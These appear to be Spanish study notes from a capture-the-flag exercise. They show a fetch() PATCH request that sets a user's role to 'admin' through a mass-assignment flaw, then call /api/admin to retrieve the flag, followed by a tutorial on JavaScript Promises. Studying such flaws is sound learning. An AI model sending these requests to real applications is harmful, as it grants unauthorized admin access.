Cambiamos a rol admin

fetch('/api/users/me', {
  method: 'PATCH',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({ role: "admin" })
})
.then(r => r.json())
.then(console.log);

el endpoint no filtraba los campos editables, aceptaba cualquier clave del JSON

buscar qué endpoint validaba ese campo server-side para dar acceso a algo

fetch('/api/users/me').then(r=>r.json()).then(console.log);
fetch('/api/admin').then(r=>r.json()).then(console.log)


El endpoint PATCH /api/users/me no aplicaba una whitelist de campos editables server-side. Codigo vulnerable

El endpoint GET /api/admin si hacia una validacion real serverside (algo como if user.role == "admin": return flag), pero como el rol del usuario haboa sido modificado via mass assignment, ese chequeo se superaba sin necesidad de credenciales de admin reales



JavaScript   --> Promises y arrow functions


fetch('/api/admin').then(r=>r.json()).then(console.log)

fetch('/api/admin') : Peticion HTTP. Por defecto hace GET. fetch() no te devuelve la respuesta directamente, devuelve una Promise


.then(r=>r.json()): arrow function equivalente a function(r) { return r.json(); }
r es el parametro (respuesta HTTP, status code, headers, etc, todavia sin parsear el body)
r.json() parsea el body como JSON. Devuelve otra Promise (porque leer y parsear el body es asincrono)
la Promise de .json() se resuelve con el objeto JS ya parseado -> se necesota otro then()


.then(console.log): Recibe el resultado de r.json() (en este caso el objeto {flag: '...', success: true}) y lo pasa como argumento a console.log
es equivalente a poner .then(data => console.log(data))


keywords

-Promise: objeto que representa "esto va a resolverse en el futuro, cuando llegue la respuesta del servidor"
-Promise {<pending>}: es el objeto promise mostrandose antes de resolverse
-then : espera al promise y usa el resultado qeu da
